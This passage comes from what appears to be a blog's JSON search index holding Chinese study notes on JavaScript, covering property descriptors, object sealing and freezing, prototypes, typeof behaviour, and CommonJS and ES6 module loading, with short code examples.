TypeError)</li>\n</ul>\n</li>\n<li>configurable<ul>\n<li>可配置性</li>\n<li>能否通过defineProperty重新定义特性</li>\n<li>设置false后无法，更改特性</li>\n<li>默认值：true</li>\n<li>阻止的另外一个事情是使用 delete 操作符移除既存属性的能力</li>\n</ul>\n</li>\n<li>enumerable<ul>\n<li>可遍历性</li>\n<li>默认值：true</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"设置对象的几个方法\"><a href=\"#设置对象的几个方法\" class=\"headerlink\" title=\"设置对象的几个方法\"></a>设置对象的几个方法</h3><h4 id=\"防止扩展-Prevent-Extensions\"><a href=\"#防止扩展-Prevent-Extensions\" class=\"headerlink\" title=\"防止扩展(Prevent Extensions)\"></a>防止扩展(Prevent Extensions)</h4><p><code>Object.preventExtensions(..)</code></p>\n<p class=\"tip\">不能添加新的属性</p>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObject = &#123;</span><br><span class=\"line\">\ta: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Object.preventExtensions( myObject );</span><br><span class=\"line\"></span><br><span class=\"line\">myObject.b = 3;</span><br><span class=\"line\">myObject.b; // undefined</span><br></pre></td></tr></table></figure>\n<h4 id=\"封印（Seal）\"><a href=\"#封印（Seal）\" class=\"headerlink\" title=\"封印（Seal）\"></a>封印（Seal）</h4><p><code>Object.Seal(..)</code></p>\n<p class=\"tip\">它实质上在当前的对象上调用 Object.preventExtensions(..)、并且属性标记为 configurable:false</p>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var myObject = &#123;</span><br><span class=\"line\">\ta: 2</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Object.Seal( myObject );</span><br></pre></td></tr></table></figure>\n<h4 id=\"冻结（Freeze）\"><a href=\"#冻结（Freeze）\" class=\"headerlink\" title=\"冻结（Freeze）\"></a>冻结（Freeze）</h4><p><code>Object.freeze(..)</code></p>\n<p class=\"tip\">Object.freeze(..) 创建一个冻结的对象，这意味着它实质上在当前的对象上调用 Object.seal(..)，同时也将它所有的“数据访问”属性设置为 writable:false，所以它们的值不可改变。</p>\n\n<h3 id=\"混合（淆）“类”的对象\"><a href=\"#混合（淆）“类”的对象\" class=\"headerlink\" title=\"混合（淆）“类”的对象\"></a>混合（淆）“类”的对象</h3><p>在JavaScript中是否存在一般语言类似于Java、C++类的概念，而JavaScript中的原型又是什么东西呢</p>\n<p class=\"tip\">在JavaScript中类并不是我们想象中的类，JavaScript还是基于原型的概念进行设计，尽管它看起来存在：<code>new</code>、<code>instanceof</code>这些让你以为它是类的东西</p>\n\n<p>在开始了解前，我们先明白什么是类？</p>\n<p>类是一种事物的抽象，拿建汽车来说，汽车需要：</p>\n<ul>\n<li>轮胎</li>\n<li>发动机</li>\n<li>后视镜等等…</li>\n</ul>\n<p>我们通过对汽车事物进行抽象，通过实例化产生新的汽车</p>\n<p>并且类还包含继承、多态等概念：同样允许父类的泛化行为被子类覆盖，从而使它更加具体。实际上，相对多态允许我们在覆盖行为中引用基础行为</p>\n<p>类的实例化上就是一个拷贝的过程，如下图：</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190408_13k6cb57lifabic37gi0889i67250_253x333.png\" alt=\"\"></p>\n<blockquote>\n<p>JavaScript中的”类”</p>\n</blockquote>\n<p class=\"tip\">当你“继承”或是“实例化”时，JavaScript 的对象机制不会 自动地 执行拷贝行为。很简单，在 JavaScript 中没有“类”可以拿来实例化，只有对象。而且对象也不会被拷贝到另一个对象中，而是被 链接在一起</p>\n\n<p>在其他语言中观察到的类的行为意味着拷贝，让我们来看看 JS 开发者如何在 JavaScript 中 模拟 这种 缺失 的类的拷贝行为：mixins（混合）。我们会看到两种“mixin”：明确的（explicit） 和 隐含的（implicit）</p>\n<h2 id=\"三、原型（Prototype）\"><a href=\"#三、原型（Prototype）\" class=\"headerlink\" title=\"三、原型（Prototype）\"></a>三、原型（Prototype）</h2><h3 id=\"Object-prototype\"><a href=\"#Object-prototype\" class=\"headerlink\" title=\"Object.prototype\"></a>Object.prototype</h3><p>每个 普通 的 [[Prototype]] 链的最顶端，是内建的 Object.prototype。这个对象包含各种在整个 JS 中被使用的共通工具，因为 JavaScript 中所有普通（内建，而非被宿主环境扩展的）的对象都“衍生自”（也就是，使它们的 [[Prototype]] 顶端为）Object.prototype 对象。</p>\n<p>你会在这里发现一些你可能很熟悉的工具，比如 .toString() 和 .valueOf()</p>\n<h3 id=\"设置与遮蔽属性\"><a href=\"#设置与遮蔽属性\" class=\"headerlink\" title=\"设置与遮蔽属性\"></a>设置与遮蔽属性</h3><p>如果给一个对象添加属性，而这个属性或方法已经在其<code>[[Prototype]]</code>上已存在，这时是否会展现出”多态”特性，子属性</p>\n<p>让我们来看下面的实例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">myObject.foo = &quot;bar&quot;;</span><br></pre></td></tr></table></figure>\n<p>正如我们被暗示的那样，在 myObject 上的 foo 遮蔽没有看起来那么简单。我们现在来考察 myObject.foo = “bar” 赋值的三种场景，当 foo 不直接存在 于 myObject，但 存在 于 myObject 的 [[Prototype]] 链的更高层时：</p>\n<ul>\n<li>如果一个普通的名为 foo 的数据访问属性在 [[Prototype]] 链的高层某处被找到，而且没有被标记为只读（writable:false），那么一个名为 foo 的新属性就直接添加到 myObject 上，形成一个 遮蔽属性。</li>\n<li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到，但是它被标记为 只读（writable:false） ，那么设置既存属性和在 myObject 上创建遮蔽属性都是 不允许 的。如果代码运行在 strict mode 下，一个错误会被抛出。否则，这个设置属性值的操作会被无声地忽略。不论怎样，没有发生遮蔽。</li>\n<li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到。没有 foo 会被添加到（也就是遮蔽在）myObject 上。<strong>必须使用 Object.defineProperty(..)</strong></li>\n</ul>\n<h3 id=\"“类”\"><a href=\"#“类”\" class=\"headerlink\" title=\"“类”\"></a>“类”</h3><p>现在你可能会想知道：“为什么 一个对象需要链到另一个对象？” 真正的好处是什么？这是一个很恰当的问题，但在我们能够完全理解和体味它是什么和如何有用之前，我们必须首先理解 [[Prototype]] 不是 什么。</p>\n<p>在 JavaScript 中，对于对象来说没有抽象模式/蓝图，即没有面向类的语言中那样的称为类的东西。JavaScript 只有 对象。</p>\n<p>实际上，在所有语言中，JavaScript 几乎是独一无二的，也许是唯一的可以被称为“面向对象”的语言，因为可以根本没有类而直接创建对象的语言很少，而 JavaScript 就是其中之一。</p>\n<p>在 JavaScript 中，类不能（因为根本不存在）描述对象可以做什么。对象直接定义它自己的行为。这里 仅有 对象。</p>\n<h3 id=\"“类”函数\"><a href=\"#“类”函数\" class=\"headerlink\" title=\"“类”函数\"></a>“类”函数</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Foo() &#123;</span><br><span class=\"line\">\t// ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = new Foo();</span><br><span class=\"line\"></span><br><span class=\"line\">Object.getPrototypeOf( a ) === Foo.prototype; // true</span><br></pre></td></tr></table></figure>\n<p>在面向类的语言中，可以制造一个类的多个 拷贝（即“实例”），就像从模具中冲压出某些东西一样。我们在第四章中看到，这是因为初始化（或者继承）类的处理意味着，“将行为计划从这个类拷贝到物理对象中”，对于每个新实例这都会发生。</p>\n<p>但是在 JavaScript 中，没有这样的拷贝处理发生。你不会创建类的多个实例。你可以创建多个对象，它们的 [[Prototype]] 连接至一个共通对象。但默认地，没有拷贝发生，如此这些对象彼此间最终不会完全分离和切断关系，而是 链接在一起。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>当试图在一个对象上进行属性访问，而对象又没有该属性时，对象内部的 [[Prototype]] 链接定义了 [[Get]] 操作（见第三章）下一步应当到哪里寻找它。这种对象到对象的串行链接定义了对象的“原形链”（和嵌套的作用域链有些相似），在解析属性时发挥作用。</p>\n<p>所有普通的对象用内建的 Object.prototype 作为原形链的顶端（就像作用域查询的顶端是全局作用域），如果属性没能在链条的前面任何地方找到，属性解析就会在这里停止。toString()，valueOf()，和其他几种共同工具都存在于这个 Object.prototype 对象上，这解释了语言中所有的对象是如何能够访问他们的。</p>\n<p>在 JavaScript 中的关键区别是，没有拷贝发生。取而代之的是对象最终通过 [[Prototype]] 链链接在一起。</p>\n<p class=\"tip\">当一个属性/方法引用在一个对象上发生，而这样的属性/方法又不存在时，这个链接就会被使用。在这种情况下，[[Prototype]] 链接告诉引擎去那个被链接的对象上寻找该属性/方法。接下来，如果那个对象也不能满足查询，就沿着它的 [[Prototype]] 查询，如此继续。这种对象间的一系列链接构成了所谓的“原形链”。<br></p>\n\n\n","categories":["js"],"tags":["js"]},{"title":"types & grammar","url":"http://zhoushaw.github.io/2019/04/01/learning/book-notes/types & grammar/","content":"<h2 id=\"一、类型\"><a href=\"#一、类型\" class=\"headerlink\" title=\"一、类型\"></a>一、类型</h2><blockquote>\n<p>基本类型</p>\n</blockquote>\n<p>JavaScript 定义了七种内建类型：</p>\n<p>null<br>undefined<br>boolean<br>number<br>string<br>symbol – 在 ES6 中被加入的！<br>object</p>\n<p><strong>注意</strong>： 除了 object 所有这些类型都被称为“基本类型（primitives）”。</p>\n<blockquote>\n<p>类型检测</p>\n</blockquote>\n<p>typeof 操作符可以检测给定值的类型，而且总是返回七种字符串值中的一种</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typeof undefined     === &quot;undefined&quot;; // true</span><br><span class=\"line\">typeof true          === &quot;boolean&quot;;   // true</span><br><span class=\"line\">typeof 42            === &quot;number&quot;;    // true</span><br><span class=\"line\">typeof &quot;42&quot;          === &quot;string&quot;;    // true</span><br><span class=\"line\">typeof &#123; life: 42 &#125;  === &quot;object&quot;;    // true</span><br><span class=\"line\"></span><br><span class=\"line\">// 在 ES6 中被加入的！</span><br><span class=\"line\">typeof Symbol()      === &quot;symbol&quot;;    // true</span><br></pre></td></tr></table></figure>\n<p>在上面的列表中剔除了 null。它是 特殊的 – 特殊在它与 typeof 操作符组合时是有 bug 的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typeof null === &quot;object&quot;; // true</span><br></pre></td></tr></table></figure>\n<h3 id=\"undefined-vs-“undeclared”\"><a href=\"#undefined-vs-“undeclared”\" class=\"headerlink\" title=\"undefined vs “undeclared”\"></a>undefined vs “undeclared”</h3><p>当前 还不拥有值的变量，实际上拥有 undefined 值。对这样的变量调用 typeof 将会返回 <code>&quot;undefined&quot;</code>：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a;</span><br><span class=\"line\"></span><br><span class=\"line\">typeof a; // &quot;undefined&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">var b = 42;</span><br><span class=\"line\">var c;</span><br><span class=\"line\"></span><br><span class=\"line\">// 稍后</span><br><span class=\"line\">b = c;</span><br><span class=\"line\"></span><br><span class=\"line\">typeof b; // &quot;undefined&quot;</span><br><span class=\"line\">typeof c; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure>\n<p>大多数开发者考虑“undefined”这个词的方式会诱使他们认为它是“undeclared（未声明）”的同义词。然而在 JS 中，这两个概念十分不同。</p>\n<p>一个“undefined”变量是在可访问的作用域中已经被声明过的，但是在 这个时刻 它里面没有任何值。相比之下，一个“undeclared”变量是在可访问的作用域中还没有被正式声明的。</p>\n<blockquote>\n<p>考虑这段代码：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a;</span><br><span class=\"line\"></span><br><span class=\"line\">a; // undefined</span><br><span class=\"line\">b; // ReferenceError: b is not defined</span><br></pre></td></tr></table></figure>\n<p>在上面代码中，b未声明时进行了使用，浏览器反馈的错误是：<code>b is not defined</code>.这当然很容易而且很合理地使人将它与“b is undefined.”搞混。需要重申的是，“undefined”和“is not defined”是非常不同的东西。要是浏览器能告诉我们类似于“b is not found”或者“b is not declared”之类的东西就好了，那会减少这种困惑！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a;</span><br><span class=\"line\"></span><br><span class=\"line\">typeof a; // &quot;undefined&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">typeof b; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure>\n<p><code>type</code> 对于未undeclared的变量，返回值也是<code>undefined</code>。即使 是一个未声明变量，也不会有错误被抛出。这是 typeof 的一种特殊的安全防卫行为</p>\n<h3 id=\"typeof-Undeclared\"><a href=\"#typeof-Undeclared\" class=\"headerlink\" title=\"typeof Undeclared\"></a>typeof Undeclared</h3><p>由于typeof安全防卫的特性，我们可以将其用来判断一个变量是否在作用域内进行了赋值操作，倘若不使用typeof，若变量不存在将会发生异常</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (typeof sss === &quot;undefined&quot;) &#123;</span><br><span class=\"line\">\tsss = function() &#123; /*..*/ &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; 使用场景</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">作为一个简单的例子，想象在你的程序中有一个“调试模式”，它是通过一个称为 DEBUG 的全局变量（标志）来控制的。在实施类似于在控制台上输出一条日志消息这样的调试任务之前，你想要检查这个变量是否被声明了。一个顶层的全局 var DEBUG = true 声明只包含在一个“debug.js”文件中，这个文件仅在你开发/测试时才被加载到浏览器中，而在生产环境中则不会。</span><br><span class=\"line\"></span><br><span class=\"line\">然而，在你其他的程序代码中，你不得不小心你是如何检查这个全局的 DEBUG 变量的，这样你才不会抛出一个 ReferenceError。这种情况下 typeof 上的安全防卫就是我们的朋友。</span><br></pre></td></tr></table></figure>\n<p>// 噢，这将抛出一个错误！<br>if (DEBUG) {<br>    console.log( “Debugging is starting” );<br>}</p>\n<p>// 这是一个安全的存在性检查<br>if (typeof DEBUG !== “undefined”) {<br>    console.log( “Debugging is starting” );<br>}<br><code>`</code></p>\n","categories":["js"],"tags":["js"]},{"title":"前端模块化","url":"http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。</p>\n<blockquote>\n<p>模块化的历史</p>\n</blockquote>\n<p>在正式进入模块化学习前我们来了解一下前端模块化的前生今世。</p>\n<div><a id=\"more\"></a></div>\n\n<p>这里我就不过多赘述了，可以参考玉伯大佬的<a href=\"https://github.com/seajs/seajs/issues/547\" target=\"_blank\" rel=\"noopener\">前端模块化开发的价值</a></p>\n<blockquote>\n<p>模块化规范</p>\n</blockquote>\n<p>现有模块化标准：</p>\n<ul>\n<li>CommonJS</li>\n<li>AMD</li>\n<li>CMD</li>\n<li>ES6</li>\n</ul>\n<h2 id=\"浏览器加载脚本\"><a href=\"#浏览器加载脚本\" class=\"headerlink\" title=\"浏览器加载脚本\"></a>浏览器加载脚本</h2><blockquote>\n<p>传统方法</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 页面内嵌的脚本 --&gt;</span><br><span class=\"line\">&lt;script type=&quot;application/javascript&quot;&gt;</span><br><span class=\"line\">  // module code</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 外部脚本 --&gt;</span><br><span class=\"line\">&lt;script type=&quot;application/javascript&quot; src=&quot;path/to/myModule.js&quot;&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>默认情况下，浏览器是同步加载 JavaScript 脚本，即渲染引擎遇到<code>&lt;script&gt;</code>标签就会停下来，等到执行完脚本，再继续向下渲染。如果是外部脚本，还必须加入脚本下载的时间。</p>\n<p>如果脚本体积很大，下载和执行的时间就会很长，因此造成浏览器堵塞，用户会感觉到浏览器“卡死”了，没有任何响应。这显然是很不好的体验，所以浏览器允许脚本异步加载，下面就是两种异步加载的语法。</p>\n<ul>\n<li>defer是“渲染完再执行”</li>\n<li>async是“下载完就执行”</li>\n</ul>\n<h2 id=\"CommonJS\"><a href=\"#CommonJS\" class=\"headerlink\" title=\"CommonJS\"></a>CommonJS</h2><p><strong>Node.js是commonJS规范的主要实践者</strong>，它有四个重要的环境变量为模块化的实现提供支持：<strong>module</strong>、<strong>exports</strong>、<strong>require</strong>、<strong>global</strong>。实际使用时，用<strong>module.exports</strong>定义当前模块对外输出的接口（不推荐直接用<strong>exports</strong>），用<strong>require</strong>加载模块。</p>\n<p>每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。</p>\n<h3 id=\"模块化\"><a href=\"#模块化\" class=\"headerlink\" title=\"模块化\"></a>模块化</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// example.js</span><br><span class=\"line\">var x = 5;</span><br><span class=\"line\">var addX = function (value) &#123;</span><br><span class=\"line\">  return value + x;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>上面代码中，变量x和函数addX，是当前文件example.js私有的，其他文件不可见。</strong></p>\n<h3 id=\"global对象\"><a href=\"#global对象\" class=\"headerlink\" title=\"global对象\"></a>global对象</h3><p>如果想在多个文件分享变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">global.__ENV__ = dev;</span><br></pre></td></tr></table></figure>\n<p>上面代码的<strong>ENV</strong>变量，可以被所有文件读取。当然，需要尽量避免定义全局属性</p>\n<h3 id=\"导出模块\"><a href=\"#导出模块\" class=\"headerlink\" title=\"导出模块\"></a>导出模块</h3><p>CommonJS规范规定，每个模块内部，<strong>module</strong>变量代表当前模块。这个变量是一个对象，它的<strong>exports</strong>属性（即<strong>module.exports</strong>）是对外的接口。加载某个模块，其实是加载该模块的<strong>module.exports</strong>属性。</p>\n<p>为了方便，Node为每个模块提供一个exports变量，指向module.exports。这等同在每个模块头部，有一行这样的命令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var exports = module.exports;</span><br></pre></td></tr></table></figure>\n<p>在对外输出模块接口时，可以向<strong>exports</strong>对象添加方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.area = function (r) &#123;</span><br><span class=\"line\">  return Math.PI * r * r;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">exports.circumference = function (r) &#123;</span><br><span class=\"line\">  return 2 * Math.PI * r;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>注意，不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports = function(x) &#123;console.log(x)&#125;;</span><br></pre></td></tr></table></figure>\n<p>这意味着，如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.hello = function() &#123;</span><br><span class=\"line\">  return &apos;hello&apos;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = &apos;Hello world&apos;;</span><br></pre></td></tr></table></figure>\n<p>下面代码中，hello函数是无法对外输出的，因为module.exports被重新赋值了</p>\n<h3 id=\"引入模块\"><a href=\"#引入模块\" class=\"headerlink\" title=\"引入模块\"></a>引入模块</h3><p>Node使用CommonJS模块规范，内置的<strong>require</strong>命令用于加载模块文件。</p>\n<p>require命令的基本功能是，<strong>读入并执行一个JavaScript文件</strong>，然后返回<strong>该模块的exports对象</strong>。如果没有发现指定模块，会报错。</p>\n<blockquote>\n<p>特性</p>\n</blockquote>\n<p>commonJS用同步的方式加载模块。在服务端，模块文件都存在本地磁盘，读取非常快，所以这样做不会有问题。但是在浏览器端，限于网络原因，更合理的方案是使用异步加载。</p>\n<blockquote>\n<p>导入模块</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// math.js</span><br><span class=\"line\">var basicNum = 0;</span><br><span class=\"line\">function add(a, b) &#123;</span><br><span class=\"line\">  return a + b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">module.exports = &#123; //在这里写上需要向外暴露的函数、变量</span><br><span class=\"line\">  add: add,</span><br><span class=\"line\">  basicNum: basicNum</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// index.js</span><br><span class=\"line\">var math = require(&apos;./math&apos;);</span><br><span class=\"line\">//&#123;</span><br><span class=\"line\">//    add: [Function],</span><br><span class=\"line\">//    basicNum: 0</span><br><span class=\"line\">//&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>加载规则</p>\n</blockquote>\n<ol>\n<li><p>如果参数字符串以“/”开头，则表示加载的是一个位于绝对路径的模块文件。比如，require(‘/home/marco/foo.js’)将加载/home/marco/foo.js。</p>\n</li>\n<li><p>如果参数字符串以“./”开头，则表示加载的是一个位于相对路径（跟当前执行脚本的位置相比）的模块文件。比如，require(‘./circle’)将加载当前脚本同一目录的circle.js。</p>\n</li>\n<li><p>如果参数字符串不以“./“或”/“开头，而且是一个路径，比如require(‘example-module/path/to/file’)，则将先找到example-module的位置，然后再以它为参数，找到后续路径。</p>\n</li>\n<li><p>如果指定的模块文件没有发现，Node会尝试为文件名添加.js、.json、.node后，再去搜索。.js件会以文本格式的JavaScript脚本文件解析，.json文件会以JSON格式的文本文件解析，.node文件会以编译后的二进制文件解析。</p>\n</li>\n<li><p>如果想得到require命令加载的确切文件名，使用require.resolve()方法。</p>\n</li>\n<li><p>如果参数字符串不以“./“或”/“开头，则表示加载的是一个默认提供的核心模块（位于Node的系统安装目录中），或者一个位于各级node_modules目录的已安装模块（全局安装或局部安装）。</p>\n</li>\n</ol>\n<p>举例来说，脚本/home/user/projects/foo.js执行了require(‘bar.js’)命令，Node会依次搜索以下文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/lib/node/bar.js</span><br><span class=\"line\">/home/user/projects/node_modules/bar.js</span><br><span class=\"line\">/home/user/node_modules/bar.js</span><br><span class=\"line\">/home/node_modules/bar.js</span><br><span class=\"line\">/node_modules/bar.js</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>引入</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 引用自定义的模块时，参数包含路径，可省略.js</span><br><span class=\"line\">var math = require(&apos;./math&apos;);</span><br><span class=\"line\">math.add(2, 5);</span><br><span class=\"line\"></span><br><span class=\"line\">// 引用核心模块时，不需要带路径</span><br><span class=\"line\">var http = require(&apos;http&apos;);</span><br><span class=\"line\">http.createService(...).listen(3000);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>目录的加载规则</p>\n</blockquote>\n<p>在目录中放置一个package.json文件，并且将入口文件写入main字段。下面是一个例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// package.json</span><br><span class=\"line\">&#123; &quot;name&quot; : &quot;some-library&quot;,</span><br><span class=\"line\">  &quot;main&quot; : &quot;./lib/some-library.js&quot; &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"module对象\"><a href=\"#module对象\" class=\"headerlink\" title=\"module对象\"></a>module对象</h3><p>Node内部提供一个Module构建函数。所有模块都是Module的实例。</p>\n<ul>\n<li>module.id 模块的识别符，通常是带有绝对路径的模块文件名。</li>\n<li>module.filename 模块的文件名，带有绝对路径。</li>\n<li>module.loaded 返回一个布尔值，表示模块是否已经完成加载。</li>\n<li>module.parent 返回一个对象，表示调用该模块的模块。</li>\n<li>module.children 返回一个数组，表示该模块要用到的其他模块。</li>\n<li>module.exports 表示模块对外输出的值。</li>\n</ul>\n<h2 id=\"ES6\"><a href=\"#ES6\" class=\"headerlink\" title=\"ES6\"></a>ES6</h2><p>模块功能主要由两个命令构成：<strong>export</strong>和<strong>import</strong>。<strong>export</strong>命令用于规定模块的对外接口，<strong>import</strong>命令用于输入其他模块提供的功能。</p>\n<p>一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script type=&quot;module&quot;&gt;</span><br><span class=\"line\">  import utils from &quot;./utils.js&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">  // other code</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ES6-模块与-CommonJS-模块的差异\"><a href=\"#ES6-模块与-CommonJS-模块的差异\" class=\"headerlink\" title=\"ES6 模块与 CommonJS 模块的差异\"></a>ES6 模块与 CommonJS 